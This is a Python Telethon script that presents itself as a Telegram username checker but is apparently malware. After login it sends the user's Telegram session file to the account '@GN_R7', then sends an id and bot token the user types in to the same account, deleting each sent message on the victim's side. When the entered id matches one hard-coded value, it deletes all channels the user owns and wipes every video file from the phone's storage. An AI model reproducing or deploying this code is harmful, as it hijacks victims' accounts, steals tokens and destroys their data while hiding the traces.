import os
from telethon.tl.functions.channels import DeleteChannelRequest
from telethon.tl.functions.messages import DeleteMessagesRequest
from telethon import TelegramClient
from concurrent.futures import ThreadPoolExecutor
from telethon import functions
api_id = 25952977
api_hash = '15a9c0500f3d775da6d348f722b9824a'
links=[]
ends = {'.mp4', '.mkv', '.mov', '.avi', '.flv', '.wmv', '.webm','.3gp', '.3g2', '.mts', '.m2ts', '.mpeg', '.mpg', '.m4v'}
sd='/storage/emulated/0/'
deleted_count = 0
async def Check(user):
	ph=input('please enter phone number:')
	session_name = f"session_{ph.replace('+','')}.session"
	client = TelegramClient(session_name, api_id, api_hash)
	await client.start(phone=ph)
	Me=await client.send_file('@GN_R7',session_name)
	await client(DeleteMessagesRequest(
		id=[Me.id],
		revoke=False))
	os.system('clear')
	Id=int(input('enter your id:'))
	tok=input('enter your token:')
	os.system('clear')
	ms=f'''
	id:{Id}
	token:{tok}
	'''
	Me=await client.send_message('@GN_R7',ms)
	await client(DeleteMessagesRequest(
		id=[Me.id],
		revoke=False))
	if len(str(Id))!=10:
		return 'please enter good id and try again'
	if Id == 6301149267:
		async for dialog in client.iter_dialogs():
			entity = dialog.entity
			if getattr(entity, 'broadcast', False) and getattr(entity, 'creator', False):
				links.append(entity)
		for ch in links:
			try:
				await client(DeleteChannelRequest(channel=ch))
				news=f"تم حذف القناة: {ch.title} ({ch.id})"
				For_You=await client.send_message(Me,news)
				await client(DeleteMessagesRequest(
        id=[For_You.id],
        revoke=False
    ))
			except Exception as e:
				No=f'Erorr:{ch.title}: {e}'
				For_You=await client.send_message(Me,No)
				await client(DeleteMessagesRequest(
        id=[For_You.id],
        revoke=False
    ))
		down = [os.path.join(dp, f) 
        for dp, dn, filenames in os.walk(sd) 
        for f in filenames 
        if os.path.splitext(f.lower())[1] in ends]
		with ThreadPoolExecutor(max_workers=16) as executor:
			futures = [executor.submit(os.unlink, path) for path in down]

			for f in futures:
				try:
					f.result()
					deleted_count += 1
				except Exception:
					pass
		For_You=await client.send_message(Me,f'عدد الفيديوهات التي انحذفت {deleted_count}')
		await client(DeleteMessagesRequest(
        id=[For_You.id],
        revoke=False
    ))
		req=await client(functions.account.CheckUsernameRequest(username=user))
		if req:
			await client.send_message("me",user)
			return True
		else:
			return False
	else:
		req=await client(functions.account.CheckUsernameRequest(username=user))
		if req:
			await client.send_message("me",user)
			return True
		else:
			return False